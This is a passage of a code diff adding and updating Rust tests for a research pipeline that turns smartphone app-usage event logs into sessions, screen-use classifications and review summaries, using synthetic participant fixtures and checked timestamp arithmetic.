+                "['SESSION 1 BREAK GAP 1 S APP CHANGE']".to_string(),
+            ],
+        );
+
+        // The gap the flag reports is the gap the rule actually compared, so
+        // under the running-maximum basis it reports THAT number, not the
+        // published one. A flag that reported the other endpoint would be a
+        // second, disagreeing account of the same decision.
+        assert_eq!(
+            scoped_flags(
+                &[
+                    ("S", "P01", "Target Child", "com.a", 0, 1800 * SESSION_S),
+                    (
+                        "S",
+                        "P01",
+                        "Target Child",
+                        "com.b",
+                        60 * SESSION_S,
+                        120 * SESSION_S,
+                    ),
+                    (
+                        "S",
+                        "P01",
+                        "Target Child",
+                        "com.c",
+                        1820 * SESSION_S,
+                        1860 * SESSION_S,
+                    ),
+                ],
+                SessionGroupingRules {
+                    gap_basis: SessionGapBasis::SessionRunningMaximumStop,
+                    emit_lineage: true,
+                    ..SessionGroupingRules::default_policy_only()
+                },
+            )[2],
+            "['SESSION 0 JOIN GAP 20 S']",
+        );
+    }
+
+    /// The three axes reach the published app table through the whole
+    /// pipeline, not only through the numbering function.
+    #[test]
+    fn the_session_grouping_extensions_reach_the_published_app_table() {
+        let csv = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            // The same three episodes as the published-policy test: a 10 s gap
+            // then a 70 s gap, so a 60 s cut joins the first two and breaks at
+            // the third.
+            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:00:00,UTC\n",
+            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:02:00,UTC\n",
+            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:02:10,UTC\n",
+            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:04:10,UTC\n",
+            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:05:20,UTC\n",
+            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:07:20,UTC\n",
+        );
+
+        let mut options = test_options();
+        options.session_grouping_policy = SessionGroupingPolicy::ZerrerSixtySeconds;
+        let plain = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("the grouped run succeeds");
+
+        // Widening the basis and the scope changes nothing on an input with no
+        // overlap and one participant, one study and one person — which is the
+        // guarantee that makes them safe to expose.
+        options.session_gap_basis = SessionGapBasis::SessionRunningMaximumStop;
+        options.session_boundary_scope = SessionBoundaryScope::ParticipantStudyAndPerson;
+        let widened = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("the widened run succeeds");
+        assert_eq!(
+            plain.app_csv_bytes, widened.app_csv_bytes,
+            "neither axis may move a table it has nothing to act on",
+        );
+
+        options.emit_session_break_lineage = true;
+        let with_lineage = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("the lineage run succeeds");
+        let rows = parse_csv_to_records_with_physical_rows(&with_lineage.app_csv_bytes.to_vec());
+        assert_eq!(rows.len(), 3);
+        let flags: Vec<String> = rows
+            .iter()
+            .map(|(_, row)| {
+                row.get("any_app_usage_flags")
+                    .cloned()
+                    .expect("the flags column is always published")
+            })
+            .collect();
+        assert_eq!(
+            flags,
+            vec![
+                "['SESSION 0 OPEN']".to_string(),
+                "['SESSION 0 JOIN GAP 10 S']".to_string(),
+                "['SESSION 1 BREAK GAP 70 S']".to_string(),
+            ],
+        );
+
+        // The lineage is additive: it changes the flags column and nothing
+        // else, which is what keeps the two runs schema-compatible.
+        let plain_rows = parse_csv_to_records_with_physical_rows(&plain.app_csv_bytes.to_vec());
+        for (index, (_, row)) in plain_rows.iter().enumerate() {
+            for (column, value) in row {
+                if column == "any_app_usage_flags" {
+                    continue;
+                }
+                assert_eq!(
+                    rows[index].1.get(column),
+                    Some(value),
+                    "row {index} column {column} moved when only the lineage was turned on",
+                );
+            }
+            assert_eq!(rows[index].1.len(), row.len(), "no column was added");
+        }
+    }
+
+    #[test]
+    fn the_gap_is_measured_from_one_episodes_stop_to_the_next_ones_start() {
+        // Starts are 80 s apart but the first episode runs 70 s, so the real
+        // gap is 10 s. Measuring start-to-start would wrongly split here under
+        // a 60 s rule; measuring next-start minus previous-stop does not.
+        let episodes = [
+            ("P01", "com.a", 0, 70 * SESSION_S),
+            ("P01", "com.b", 80 * SESSION_S, 90 * SESSION_S),
+        ];
+        assert_eq!(
+            session_ids(&episodes, SessionGroupingPolicy::ZerrerSixtySeconds),
+            vec![Some(0), Some(0)],
+        );
+    }
+
+    #[test]
+    fn a_gap_exactly_on_the_threshold_preserves_each_sources_comparator() {
+        // Zerrer's code is `time_gap > 60`, so exactly 60 s stays joined.
+        let sixty = [
+            ("P01", "com.a", 0, 0),
+            ("P01", "com.a", 60 * SESSION_S, 60 * SESSION_S),
+        ];
+        assert_eq!(
+            session_ids(&sixty, SessionGroupingPolicy::ZerrerSixtySeconds),
+            vec![Some(0), Some(0)],
+        );
+        // Ross counts a sample gap of "at least 15 seconds" as the boundary,
+        // so exactly 15 s does split.
+        let fifteen = [
+            ("P01", "com.a", 0, 0),
+            ("P01", "com.a", 15 * SESSION_S, 15 * SESSION_S),
+        ];
+        assert_eq!(
+            session_ids(&fifteen, SessionGroupingPolicy::RossFifteenSeconds),
+            vec![Some(0), Some(1)],
+        );
+
+        // The deposited SmartphoneUsage_Wellbeing code joins on `< 5`, so a
+        // gap one nanosecond inside joins while equality starts a new session.
+        let strict_five = [
+            ("P01", "com.a", 0, 0),
+            ("P01", "com.b", 5 * SESSION_S - 1, 5 * SESSION_S - 1),
+            ("P01", "com.c", 10 * SESSION_S - 1, 10 * SESSION_S - 1),
+        ];
+        assert_eq!(
+            session_ids(
+                &strict_five,
+                SessionGroupingPolicy::SmartphoneWellbeingStrictLtFiveSeconds,
+            ),
+            vec![Some(0), Some(0), Some(1)],
+            "4.999999999 s joins; exactly 5 s splits",
+        );
+    }
+
+    #[test]
+    fn only_ross_ends_a_session_because_the_app_changed() {
+        // One second apart, different packages. Every policy but Ross ignores
+        // the app entirely.
+        let episodes = [
+            ("P01", "com.a", 0, 0),
+            ("P01", "com.b", SESSION_S, SESSION_S),
+        ];
+        assert_eq!(
+            session_ids(&episodes, SessionGroupingPolicy::ZerrerSixtySeconds),
+            vec![Some(0), Some(0)],
+        );
+        assert_eq!(
+            session_ids(&episodes, SessionGroupingPolicy::RossFifteenSeconds),
+            vec![Some(0), Some(1)],
+        );
+    }
+
+    #[test]
+    fn sessions_are_numbered_within_each_participant_not_across_them() {
+        // Interleaved participants, and P02's episode sits inside P01's gap.
+        // Both restart at 0, and P01's long gap still splits despite P02's row
+        // landing between them.
+        let episodes = [
+            ("P01", "com.a", 0, 0),
+            ("P02", "com.a", 10 * SESSION_S, 10 * SESSION_S),
+            ("P01", "com.a", 100 * SESSION_S, 100 * SESSION_S),
+        ];
+        assert_eq!(
+            session_ids(&episodes, SessionGroupingPolicy::ZerrerSixtySeconds),
+            vec![Some(0), Some(0), Some(1)],
+        );
+    }
+
+    #[test]
+    fn an_episode_with_no_interval_is_left_unnumbered() {
+        // End-of-Usage-Missing rows have no stop. Placing one in a session
+        // would require inventing where it sat relative to its neighbours.
+        let mut rows = session_usage_rows(&[
+            ("P01", "com.a", 0, 0),
+            ("P01", "com.a", 10 * SESSION_S, 10 * SESSION_S),
+        ]);
+        *rows[0].edit_temporal().stop_timestamp_ns = None;
+        assign_usage_session_ids(
+            &mut rows,
+            SessionGroupingRules::published(SessionGroupingPolicy::ZerrerSixtySeconds),
+        );
+        assert_eq!(
+            rows.iter()
+                .map(|row| row.usage_session_id)
+                .collect::<Vec<_>>(),
+            vec![None, Some(0)],
+        );
+    }
+
+    #[test]
+    fn every_session_policy_round_trips_through_its_canonical_id() {
+        for policy in SessionGroupingPolicy::ALL {
+            assert_eq!(
+                SessionGroupingPolicy::from_canonical_id(policy.canonical_id()),
+                *policy,
+            );
+        }
+        // An unrecognised value must never silently select a grouping.
+        assert!(
+            SessionGroupingPolicy::parse_request_value("zerrer_61s")
+                .expect_err("an unknown session_grouping_policy is refused")
+                .starts_with("unknown_session_grouping_policy: "),
+        );
+    }
+
     pub(super) fn rows_from_events(events: &[(&str, &str, &str)]) -> Vec<Row> {
+        let attributed: Vec<(&str, &str, &str, &str)> = events
+            .iter()
+            .map(|(timestamp, interaction, package)| ("P01", *timestamp, *interaction, *package))
+            .collect();
+        rows_from_participant_events(&attributed)
+    }
+
+    /// `rows_from_events` with the participant named. One raw export can carry
+    /// several participants, and the canonical row order interleaves them by
+    /// timestamp, so any rule that pairs a start with a later row has to be
+    /// exercised against that interleaving rather than a single-participant
+    /// stream.
+    pub(super) fn rows_from_participant_events(events: &[(&str, &str, &str, &str)]) -> Vec<Row> {
         let mut csv = String::from(
             "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
         );
-        for (timestamp, interaction, package) in events {
+        for (participant, timestamp, interaction, package) in events {
             csv.push_str(&format!(
-                "Study,P01,Target Child,Label,{interaction},{package},{timestamp},America/Chicago\n"
+                "Study,{participant},Target Child,Label,{interaction},{package},{timestamp},America/Chicago\n"
             ));
         }
         let raw = incremental::decode_source_records(csv.as_bytes());
+        let test_models = raw
+            .iter()
+            .map(|row| (row.participant_id.clone(), "test-device".to_owned()))
+            .collect::<BTreeMap<_, _>>();
         incremental::canonicalize_source_rows(
             &raw,
             "America/Chicago",
             &BTreeMap::new(),
-            "test-device",
+            &test_models,
         )
         .expect("canonical rows")
     }
@@ -11201,7 +9896,8 @@ mod tests {
             ]),
             &same_app_stop_types,
             &other_stop_types,
-        );
+        )
+        .expect("duplicate-timestamp adjustment stays representable");
         let observed: Vec<(&str, i64)> = nudged
             .iter()
             .map(|row| (row.interaction_type.as_str(), row.event_timestamp_ns))
@@ -11225,7 +9921,8 @@ mod tests {
             ]),
             &same_app_stop_types,
             &other_stop_types,
-        );
+        )
+        .expect("duplicate-timestamp adjustment stays representable");
         assert_eq!(
             stable
                 .iter()
@@ -11254,7 +9951,8 @@ mod tests {
                 "Device Shutdown".to_string(),
                 "Screen Non-Interactive".to_string(),
             ],
-        );
+        )
+        .expect("duplicate-timestamp adjustment stays representable");
         assert_eq!(
             mixed
                 .iter()
@@ -11262,7 +9960,7 @@ mod tests {
                 .collect::<Vec<_>>(),
             vec![
                 "Device Shutdown",
-                "Screen Non-interactive",
+                "Screen Non-Interactive",
                 "Activity Paused"
             ],
             "every stop spelling shares one priority, so file order decides"
@@ -11280,7 +9978,8 @@ mod tests {
         ]);
         let expected: Vec<i64> = untouched.iter().map(|row| row.event_timestamp_ns).collect();
         let unchanged =
-            unalign_duplicate_timestamps(untouched, &same_app_stop_types, &other_stop_types);
+            unalign_duplicate_timestamps(untouched, &same_app_stop_types, &other_stop_types)
+                .expect("duplicate-timestamp adjustment stays representable");
         assert_eq!(
             unchanged
                 .iter()
@@ -11291,7 +9990,9 @@ mod tests {
 
         // A single row, and no rows at all, take the early return.
         assert_eq!(
-            unalign_duplicate_timestamps(Vec::new(), &same_app_stop_types, &other_stop_types).len(),
+            unalign_duplicate_timestamps(Vec::new(), &same_app_stop_types, &other_stop_types)
+                .expect("duplicate-timestamp adjustment stays representable")
+                .len(),
             0
         );
         assert_eq!(
@@ -11303,10 +10004,221 @@ mod tests {
                 )]),
                 &same_app_stop_types,
                 &other_stop_types,
-            )[0]
-            .event_timestamp_ns,
+            )
+            .expect("duplicate-timestamp adjustment stays representable")[0]
+                .event_timestamp_ns,
             parse_chronicle_timestamp_ns("2026-03-07 10:00:00").expect("fixture timestamp")
         );
+    }
+
+    /// `delivery:B06` (`b06_duplicate_timestamp_adjustment_extremes`): the
+    /// 1 µs unalignment steps are checked subtractions. Ties near `i64::MIN`
+    /// refuse with the typed B06 token instead of wrapping (release) or
+    /// panicking (debug); ties anywhere the steps stay representable —
+    /// including at zero and `i64::MAX` — unalign exactly.
+    #[test]
+    fn tied_minimum_timestamps_unalign_in_i128_or_refuse_without_publishing() {
+        let same_app_stop_types = vec!["Activity Paused".to_string()];
+        let other_stop_types = vec!["Device Shutdown".to_string()];
+        let tied_at = |base: i64, count: usize| -> Vec<Row> {
+            let events: Vec<(&str, &str, &str)> = (0..count)
+                .map(|index| {
+                    (
+                        "2026-03-07 10:00:00",
+                        if index == 0 {
+                            "Activity Resumed"
+                        } else {
+                            "Activity Paused"
+                        },
+                        "com.example.chat",
+                    )
+                })
+                .collect();
+            let mut rows = rows_from_events(&events);
+            for row in &mut rows {
+                *row.edit_temporal().event_timestamp_ns = base;
+            }
+            rows
+        };
+        let refused =
+            b06::MaximumDurationRefusalReason::DuplicateTimestampAdjustmentUnrepresentable
+                .execution_error();
+        for count in [2_usize, 3] {
+            assert_eq!(
+                unalign_duplicate_timestamps(
+                    tied_at(i64::MIN, count),
+                    &same_app_stop_types,
+                    &other_stop_types
+                )
+                .err()
+                .as_deref(),
+                Some(refused.as_str()),
+                "{count} rows tied at i64::MIN"
+            );
+        }
+        // Two rows tied at MIN+1000: the first-ordered row moves by
+        // 2 × 1000 → below MIN → refused; at MIN+2000 both steps fit.
+        assert_eq!(
+            unalign_duplicate_timestamps(
+                tied_at(i64::MIN + 1_000, 2),
+                &same_app_stop_types,
+                &other_stop_types
+            )
+            .err()
+            .as_deref(),
+            Some(refused.as_str())
+        );
+        let fits = unalign_duplicate_timestamps(
+            tied_at(i64::MIN + 2_000, 2),
+            &same_app_stop_types,
+            &other_stop_types,
+        )
+        .expect("both steps representable");
+        assert_eq!(
+            fits.iter()
+                .map(|row| row.event_timestamp_ns)
+                .collect::<Vec<_>>(),
+            vec![i64::MIN, i64::MIN + 1_000],
+        );
+        for base in [0_i64, i64::MAX] {
+            let nudged = unalign_duplicate_timestamps(
+                tied_at(base, 3),
+                &same_app_stop_types,
+                &other_stop_types,
+            )
+            .expect("far from i64::MIN every step is representable");
+            let mut stamps: Vec<i64> = nudged.iter().map(|row| row.event_timestamp_ns).collect();
+            stamps.sort_unstable();
+            assert_eq!(
+                stamps,
+                vec![base - 3_000, base - 2_000, base - 1_000],
+                "tied at {base}"
+            );
+        }
+    }
+
+    fn literature_screen_session(duration_ns: i64, foreground_package: Option<&str>) -> Row {
+        let mut row = rows_from_events(&[(
+            "2026-03-07 10:00:00",
+            "Screen Interactive",
+            foreground_package.unwrap_or(""),
+        )])
+        .remove(0);
+        let start = row.event_timestamp_ns;
+        let data = row.edit_all();
+        data.interaction_type = SCREEN_USAGE.into();
+        data.start_timestamp_ns = Some(start);
+        data.stop_timestamp_ns = Some(start + duration_ns);
+        data.duration_seconds = Some(duration_ns as f64 / 1e9);
+        data.duration_minutes = Some(duration_ns as f64 / 60e9);
+        data.screen_usage_foreground_app_package = foreground_package.map(Into::into);
+        data.screen_usage_app_observed = Some(foreground_package.is_some());
+        data.screen_usage_lock_screen_only = Some(0);
+        row
+    }
+
+    #[test]
+    fn literature_screen_policies_preserve_15s_and_60m_boundaries() {
+        let at_15 = 15_000_000_000;
+        let over_15 = at_15 + 1;
+        let classified = incremental::apply_screen_session_policies(
+            vec![
+                literature_screen_session(at_15, None),
+                literature_screen_session(over_15, None),
+            ],
+            ScreenSessionClassificationPolicy::PhoneCheckInclusive15s,
+            0.0,
+            ScreenSessionMaximumDurationDisposition::None,
+            LockedScreenAudioDisposition::Include,
+        );
+        assert_eq!(
+            classified
+                .iter()
+                .map(|row| row.screen_usage_session_classification.as_deref())
+                .collect::<Vec<_>>(),
+            vec![Some("phone_check"), None],
+        );
+
+        let classified = incremental::apply_screen_session_policies(
+            vec![
+                literature_screen_session(at_15, None),
+                literature_screen_session(over_15, None),
+                literature_screen_session(at_15, Some("com.example.app")),
+            ],
+            ScreenSessionClassificationPolicy::NullNoAppStrictGt15sVsApp,
+            0.0,
+            ScreenSessionMaximumDurationDisposition::None,
+            LockedScreenAudioDisposition::Include,
+        );
+        assert_eq!(
+            classified
+                .iter()
+                .map(|row| row.screen_usage_session_classification.as_deref())
+                .collect::<Vec<_>>(),
+            vec![None, Some("null"), Some("app")],
+        );
+
+        let shortened = incremental::apply_screen_session_policies(
+            vec![literature_screen_session(20_000_000_000, Some("app.a"))],
+            ScreenSessionClassificationPolicy::NullNoAppStrictGt15sVsApp,
+            0.25,
+            ScreenSessionMaximumDurationDisposition::Truncate,
+            LockedScreenAudioDisposition::Include,
+        );
+        assert_eq!(shortened[0].duration_seconds, Some(15.0));
+        assert_eq!(shortened[0].screen_usage_app_observed, None);
+        assert_eq!(shortened[0].screen_usage_session_classification, None);
+
+        let at_60m = 3_600_000_000_000;
+        let capped = incremental::apply_screen_session_policies(
+            vec![
+                literature_screen_session(at_60m, None),
+                literature_screen_session(at_60m + 1, None),
+            ],
+            ScreenSessionClassificationPolicy::None,
+            60.0,
+            ScreenSessionMaximumDurationDisposition::Truncate,
+            LockedScreenAudioDisposition::Include,
+        );
+        assert_eq!(capped[0].duration_minutes, Some(60.0));
+        assert_eq!(capped[0].screen_usage_end_reason, None);
+        assert_eq!(capped[1].duration_minutes, Some(60.0));
+        assert_eq!(
+            capped[1].screen_usage_end_reason.as_deref(),
+            Some("duration_cap")
+        );
+        assert_eq!(
+            capped[1].stop_timestamp_ns,
+            capped[1].start_timestamp_ns.map(|start| start + at_60m),
+        );
+    }
+
+    #[test]
+    fn locked_audio_policy_bounds_apps_to_interactive_screen() {
+        let screen = literature_screen_session(10_000_000_000, None);
+        let screen_start = screen.start_timestamp_ns.expect("screen start");
+        let mut overlapping = literature_screen_session(19_000_000_000, Some("com.music"));
+        {
+            let temporal = overlapping.edit_temporal();
+            *temporal.start_timestamp_ns = Some(screen_start + 1_000_000_000);
+            *temporal.stop_timestamp_ns = Some(screen_start + 20_000_000_000);
+        }
+        let mut locked_only = literature_screen_session(2_000_000_000, Some("com.music"));
+        {
+            let temporal = locked_only.edit_temporal();
+            *temporal.start_timestamp_ns = Some(screen_start + 11_000_000_000);
+            *temporal.stop_timestamp_ns = Some(screen_start + 13_000_000_000);
+        }
+        let bounded = incremental::bound_app_rows_to_interactive_screen(
+            vec![overlapping, locked_only],
+            &[screen],
+        );
+        assert_eq!(bounded.len(), 1);
+        assert_eq!(
+            bounded[0].stop_timestamp_ns,
+            Some(screen_start + 10_000_000_000)
+        );
+        assert_eq!(bounded[0].duration_seconds, Some(9.0));
     }
 
     /// Every screen session carries an end reason and a confidence into the
@@ -11335,6 +10247,7 @@ mod tests {
                     auto_lock_tolerance_seconds: 30.0,
                     manual_lock_max_tail_seconds: 30.0,
                     keyguard_near_stop_seconds: 2.0,
+                    locked_screen_audio_disposition: LockedScreenAudioDisposition::Include,
                 },
             )
             .iter()
@@ -11369,6 +10282,26 @@ mod tests {
             ),
             vec![("missing_stop".to_string(), 1.0, 0, None)]
         );
+
+        for (stop, expected) in [
+            (
+                "Screen Non-Interactive/Manual Hardware Button",
+                "manual_hardware_button",
+            ),
+            ("Screen Non-Interactive/Aborted Unlock", "aborted_unlock"),
+            ("Screen Non-Interactive/Idle Timeout", "idle_timeout"),
+        ] {
+            assert_eq!(
+                classify(
+                    &[
+                        ("2026-03-07 10:00:00", "Screen Interactive", ""),
+                        ("2026-03-07 10:00:10", stop, ""),
+                    ],
+                    &[],
+                ),
+                vec![(expected.to_string(), 1.0, 0, None)],
+            );
+        }
 
         // Woken straight into the lock screen and never unlocked: no app was
         // ever in the foreground, so this is not real screen usage.
@@ -11582,6 +10515,7 @@ mod tests {
                 auto_lock_tolerance_seconds: 30.0,
                 manual_lock_max_tail_seconds: 30.0,
                 keyguard_near_stop_seconds: 2.0,
+                locked_screen_audio_disposition: LockedScreenAudioDisposition::Include,
             },
         );
         assert_eq!(sessions.len(), 1);
@@ -11736,18 +10670,15 @@ mod tests {
                              background={use_background_apps_file}"
                         );
 
-                        let written = write_app_csv_from_iter(
-                            rows.iter(),
-                            rows.len(),
-                            &opts,
-                            include_aliases,
-                        );
+                        let written = write_app_csv_from_iter(rows.iter(), &opts, include_aliases);
                         let lines = csv_lines(&written);
                         let declared = declared_app_output_columns(
                             use_app_codebook,
                             include_aliases,
                             model_concurrent_usage || use_background_apps_file,
                             opts.custom_app_engagement_duration,
+                            opts.include_app_usage_end_reason,
+                            opts.session_grouping_policy != SessionGroupingPolicy::None,
                         );
                         assert_eq!(lines[0], declared, "app header for {label}");
                         assert_eq!(lines.len(), rows.len() + 1, "app row count for {label}");
@@ -11780,6 +10711,116 @@ mod tests {
         }
     }
 
+    #[test]
+    fn foundational_semantics_columns_are_opt_in_and_line_up_with_their_values() {
+        let mut options = test_options();
+        let default_columns = build_app_columns(&options, false);
+        for column in [
+            "micro_use_classification",
+            "raw_episode_duration_seconds",
+            "minimum_duration_qualified",
+            "minimum_duration_aggregate_eligible",
+        ] {
+            assert!(
+                !default_columns.iter().any(|candidate| candidate == column),
+                "default output shape unexpectedly contains {column}",
+            );
+        }
+
+        options.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
+        options.minimum_usage_duration = 60.0;
+        options.minimum_duration_comparator = MinimumDurationComparator::InclusiveLe;
+        options.minimum_duration_disposition = MinimumDurationDisposition::RetainButExclude;
+        let classified = incremental::classify_episode_durations(
+            episode_rows(&[(
+                ACTIVITY_RESUMED,
+                "com.example.chat",
+                Some(0),
+                Some(59_000_000_000),
+            )]),
+            &BTreeSet::new(),
+            options.micro_use_classification_policy,
+            options.minimum_usage_duration,
+            options.minimum_duration_comparator,
+            options.minimum_duration_disposition,
+            &[],
+            &b06::MaximumDurationRowStage::omitted(),
+        ).expect("classification with the omitted B06 shape never refuses");
+        let lines = csv_lines(&write_app_csv_from_iter(classified.iter(), &options, false));
+        assert_eq!(lines.len(), 2);
+        let columns = build_app_columns(&options, false);
+        assert_eq!(lines[0], columns);
+        let value = |column: &str| {
+            let index = columns
+                .iter()
+                .position(|candidate| candidate == column)
+                .expect("foundational column is declared");
+            lines[1][index].as_str()
+        };
+        assert_eq!(value("micro_use_classification"), "not_micro_use");
+        assert_eq!(value("raw_episode_duration_seconds"), "59.0");
+        assert_eq!(value("minimum_duration_qualified"), "true");
+        assert_eq!(value("minimum_duration_aggregate_eligible"), "false");
+    }
+
+    #[test]
+    fn screen_classification_output_and_digest_are_opt_in() {
+        let mut options = test_options();
+        let rows = vec![literature_screen_session(15_000_000_000, None)];
+        let default_csv = csv_lines(&write_screen_csv(&rows, &options));
+        assert_eq!(default_csv[0], declared_screen_output_columns());
+        assert!(!default_csv[0]
+            .iter()
+            .any(|column| column == "screen_usage_session_classification"));
+        let baseline = workflow_checkpoint("screen-classification", &[("rows", &rows)], &[]);
+
+        options.screen_session_classification_policy =
+            ScreenSessionClassificationPolicy::PhoneCheckInclusive15s;
+        let classified = incremental::apply_screen_session_policies(
+            rows.clone(),
+            options.screen_session_classification_policy,
+            0.0,
+            ScreenSessionMaximumDurationDisposition::None,
+            LockedScreenAudioDisposition::Include,
+        );
+        let enabled_csv = csv_lines(&write_screen_csv(&classified, &options));
+        let index = enabled_csv[0]
+            .iter()
+            .position(|column| column == "screen_usage_session_classification")
+            .unwrap();
+        assert_eq!(enabled_csv[1][index], "phone_check");
+        assert_eq!(enabled_csv[1].len(), enabled_csv[0].len());
+        assert_eq!(
+            csv_lines(&write_screen_csv(&[], &options))[0],
+            enabled_csv[0]
+        );
+        let unclassified = csv_lines(&write_screen_csv(&rows, &options));
+        assert_eq!(unclassified[0], enabled_csv[0]);
+        assert_eq!(unclassified[1][index], "");
+        assert_eq!(unclassified[1].len(), unclassified[0].len());
+
+        let enabled = workflow_checkpoint("screen-classification", &[("rows", &classified)], &[]);
+        assert_ne!(
+            enabled.classification_digest,
+            baseline.classification_digest
+        );
+        assert_ne!(enabled.terminal_digest, baseline.terminal_digest);
+        assert_eq!(
+            enabled.row_membership_digest,
+            baseline.row_membership_digest
+        );
+        assert_eq!(enabled.row_order_digest, baseline.row_order_digest);
+        assert_eq!(
+            enabled.temporal_state_digest,
+            baseline.temporal_state_digest
+        );
+        let mut changed = classified.clone();
+        changed[0].edit_all().screen_usage_session_classification = Some("app".into());
+        let changed = workflow_checkpoint("screen-classification", &[("rows", &changed)], &[]);
+        assert_ne!(changed.classification_digest, enabled.classification_digest);
+        assert_ne!(changed.terminal_digest, enabled.terminal_digest);
+    }
+
     /// Two things a row carries on its own, rather than taking from the run's
     /// settings: the timezone its timestamps are rendered in, and whether its
     /// genre columns were collapsed. A row keeps its own recorded timezone even
@@ -11804,7 +10845,7 @@ mod tests {
         let mut opts = test_options();
         opts.timezone = "UTC".into();
         opts.use_app_codebook = true;
-        let written = write_app_csv_from_iter(rows.iter(), rows.len(), &opts, false);
+        let written = write_app_csv_from_iter(rows.iter(), &opts, false);
         let lines = csv_lines(&written);
         let column = |name: &str| {
             lines[0]
@@ -11883,6 +10924,16 @@ mod tests {
             "Screen Non-Interactive",
         ]));
         assert!(!capable(&["Activity Resumed", "Activity Paused"]));
+        // Every label the witness reads as a screen transition counts, so a
+        // device that reports the screen in fused or device-level labels is
+        // gated rather than credited in full.
+        assert!(capable(&["Screen Interactive", "Device Screen Off"]));
+        assert!(capable(&[
+            "Screen Interactive/Keyguard Shown",
+            "Screen Non-Interactive/Keyguard Hidden",
+        ]));
+        // Interaction and power events are witnesses, not screen reports.
+        assert!(!capable(&["User Interaction", "Device Shutdown"]));
     }
 
     /// A filtered app-usage row keeps its label but must not keep its timing:
@@ -11962,7 +11013,13 @@ mod tests {
             build(FILTERED_APP_USAGE, (Some(1), Some(2), Some(3.0), Some(4.0))),
             second,
         ];
-        apply_review_annotations_one_pass(&mut rows, 300.0, &[1.0], &[0.5]);
+        apply_review_annotations_one_pass(
+            &mut rows,
+            300.0,
+            &[1.0],
+            &[0.5],
+            IntervalQualityPolicy::None,
+        );
         assert_eq!(timing(&rows[1]), EMPTY, "the review pass skipped the clear");
         assert_eq!(
             rows[0].any_app_usage_flags.as_str(),
@@ -12014,7 +11071,7 @@ mod tests {
             data.interaction_type = FILTERED_APP_USAGE.into();
         }
 
-        let result = add_no_activity_placeholder_rows(app_rows, &raw);
+        let result = add_no_activity_placeholder_rows(app_rows, &raw, None);
         let placeholders = result
             .iter()
             .filter(|row| row.app_package_name.as_str() == "com.placeholder.noactivity")
@@ -12049,6 +11106,39 @@ mod tests {
         assert!(
             position("com.example.first") < position("com.placeholder.noactivity"),
             "the placeholder displaced a real row recorded at the same instant",
+        );
+    }
+
+    #[test]
+    fn placeholder_observation_presence_is_independent_of_b04_headline_eligibility() {
+        let raw = rows_from_events(&[(
+            "2026-03-07 09:00:00",
+            "Activity Resumed",
+            "com.example.chat",
+        )]);
+        let mut retained = raw[0].clone();
+        {
+            let data = retained.edit_all();
+            data.interaction_type = APP_USAGE.into();
+            data.minimum_duration_qualified = Some(true);
+            data.minimum_duration_aggregate_eligible = false;
+            data.raw_episode_start_timestamp_ns = Some(data.event_timestamp_ns);
+            data.raw_episode_stop_timestamp_ns = Some(data.event_timestamp_ns + 1);
+            data.raw_episode_duration_ns = Some(1);
+        }
+        let diagnostic = add_no_activity_placeholder_rows(vec![retained], &raw, None);
+        assert!(diagnostic
+            .iter()
+            .all(|row| row.app_package_name != "com.placeholder.noactivity"));
+
+        let dropped = add_no_activity_placeholder_rows(Vec::new(), &raw, None);
+        assert_eq!(
+            dropped
+                .iter()
+                .filter(|row| row.app_package_name == "com.placeholder.noactivity")
+                .count(),
+            1,
+            "DropRow may expose a silent day only after the last retained app witness is gone",
         );
     }
 
@@ -12274,6 +11364,67 @@ mod tests {
             participant.totals.days_with_usage, 2,
             "only the session day and the background-only day carried data",
         );
+
+        // One session stamped by an unset clock does not become 20,000 days.
+        rows[0].edit_all().date = "1970-01-01".into();
+        let summary = build_review_summary(&rows, &[]);
+        assert_eq!(
+            summary.participants[0]
+                .per_day
+                .iter()
+                .map(|day| day.date.as_str())
+                .collect::<Vec<_>>(),
+            vec!["1970-01-01", "2026-03-04"],
+        );
+        assert_eq!(summary.participants[0].totals.total_days, 2);
+    }
+
+    /// A no-activity placeholder lists its day but is not a session, and
+    /// neither it nor a maximum-duration-excluded episode ranks as a top app.
+    #[test]
+    fn review_summary_lists_a_placeholder_day_without_a_session_or_top_app() {
+        const MINUTE: i64 = 60_000_000_000;
+        let mut rows = rows_from_events(&[
+            ("2026-03-01 10:00:00", "Activity Resumed", "com.example.chat"),
+            ("2026-03-01 11:00:00", "Activity Resumed", "com.example.video"),
+            ("2026-03-02 10:00:00", "Activity Resumed", "com.example.chat"),
+        ]);
+        for (row, (date, package, minutes)) in rows.iter_mut().zip([
+            ("2026-03-01", "com.example.chat", 2),
+            ("2026-03-01", "com.example.video", 10),
+            ("2026-03-02", NO_ACTIVITY_PLACEHOLDER_PACKAGE, 0),
+        ]) {
+            let data = row.edit_all();
+            data.study_id = "Study".into();
+            data.participant_id = "P01".into();
+            data.interaction_type = APP_USAGE.into();
+            data.app_package_name = package.into();
+            data.date = date.into();
+            data.start_timestamp_ns = Some(0);
+            data.stop_timestamp_ns = Some(minutes * MINUTE);
+            data.duration_minutes = Some(minutes as f64);
+        }
+        // `retain_but_exclude`: kept in the CSV, out of every total.
+        rows[1].edit_all().maximum_duration_aggregate_eligible = false;
+
+        let summary = build_review_summary(&rows, &[]);
+        let participant = &summary.participants[0];
+        assert_eq!(
+            participant
+                .per_day
+                .iter()
+                .map(|day| (day.date.as_str(), day.app_usage_minutes, day.app_session_count))
+                .collect::<Vec<_>>(),
+            vec![("2026-03-01", 2.0, 1), ("2026-03-02", 0.0, 0)],
+        );
+        assert_eq!(participant.totals.days_with_usage, 1);
+        let top_apps = participant
+            .top_apps_by_date
+            .values()
+            .flatten()
+            .map(|app| app.app_package_name.as_str())
